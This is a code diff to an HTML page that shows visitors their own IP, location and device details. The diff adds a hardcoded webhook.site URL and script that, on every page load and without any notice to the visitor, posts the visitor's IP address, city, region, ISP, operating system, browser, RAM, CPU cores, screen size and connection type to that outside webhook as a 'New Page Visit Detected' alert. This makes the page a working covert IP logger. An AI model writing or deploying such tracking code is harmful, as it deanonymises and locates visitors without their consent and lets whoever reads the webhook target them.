@@ -94,19 +94,10 @@
 </div>
 
 <script>
-    // 1. Fetch Public IP and Location using a free API
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            document.getElementById('ip').innerText = data.ip || 'Unavailable';
-            document.getElementById('location').innerText = `${data.city}, ${data.region}, ${data.country_name} (${data.org || 'Unknown ISP'})`;
-        })
-        .catch(() => {
-            document.getElementById('ip').innerText = 'Failed to load';
-            document.getElementById('location').innerText = 'Failed to load';
-        });
+    // Replace with your actual webhook URL
+    const WEBHOOK_URL = 'https://webhook.site/7c89a6a0-225d-4dd5-9090-881977af0018';
 
-    // 2. Hardware and Browser Information via Navigator API
+    // Gather specs
     const ua = navigator.userAgent;
 
     // Operating System Detection
@@ -135,24 +126,67 @@
     else if (ua.indexOf("Safari") !== -1) browser = "Apple Safari";
     document.getElementById('browser').innerText = browser;
 
-    // RAM (Device Memory - returns rough estimates like 2, 4, 8 GB due to security)
-    if (navigator.deviceMemory) {
-        document.getElementById('ram').innerText = `~${navigator.deviceMemory} GB (Approximate)`;
-    }
+    // RAM
+    let ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Unknown";
+    document.getElementById('ram').innerText = ram !== "Unknown" ? `${ram} (Approximate)` : "Not supported";
 
     // CPU Cores
-    if (navigator.hardwareConcurrency) {
-        document.getElementById('cpu').innerText = `${navigator.hardwareConcurrency} Cores`;
-    }
+    let cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
+    document.getElementById('cpu').innerText = cpu;
 
     // Screen Resolution
-    document.getElementById('screen').innerText = `${window.screen.width} x ${window.screen.height} pixels`;
+    let screenRes = `${window.screen.width} x ${window.screen.height} pixels`;
+    document.getElementById('screen').innerText = screenRes;
 
-    // Network Connection Type
+    // Connection Type
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (conn) {
-        document.getElementById('connection').innerText = `${conn.effectiveType ? conn.effectiveType.toUpperCase() : 'Unknown'} (~${conn.downlink ? conn.downlink + ' Mbps' : 'N/A'})`;
-    }
+    let connectionType = conn ? `${conn.effectiveType ? conn.effectiveType.toUpperCase() : 'Unknown'} (~${conn.downlink ? conn.downlink + ' Mbps' : 'N/A'})` : "Unknown";
+    document.getElementById('connection').innerText = connectionType;
+
+    // 1. Fetch Public IP and Location, then send everything to the webhook
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip || 'Unavailable';
+            const location = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'} (${data.org || 'Unknown ISP'})`;
+
+            document.getElementById('ip').innerText = ip;
+            document.getElementById('location').innerText = location;
+
+            // Compile payload data
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🚨 New Page Visit Detected!",
+                    color: 3447003,
+                    fields: [
+                        { name: "🌍 IP Address", value: ip, inline: true },
+                        { name: "📍 Location / ISP", value: location, inline: false },
+                        { name: "💻 Operating System", value: os, inline: true },
+                        { name: "📱 Device Type", value: deviceType, inline: true },
+                        { name: "🌐 Browser", value: browser, inline: true },
+                        { name: "🧠 Approx. RAM", value: ram, inline: true },
+                        { name: "⚡ CPU Cores", value: cpu, inline: true },
+                        { name: "🖥️ Screen", value: screenRes, inline: true },
+                        { name: "📶 Connection", value: connectionType, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Send to webhook (Discord format structured above, modify payload structure if using a standard JSON webhook)
+            if (WEBHOOK_URL && WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.error("Webhook error:", err));
+            }
+        })
+        .catch(() => {
+            document.getElementById('ip').innerText = 'Failed to load';
+            document.getElementById('location').innerText = 'Failed to load';
+        });
 </script>
 
 </body>
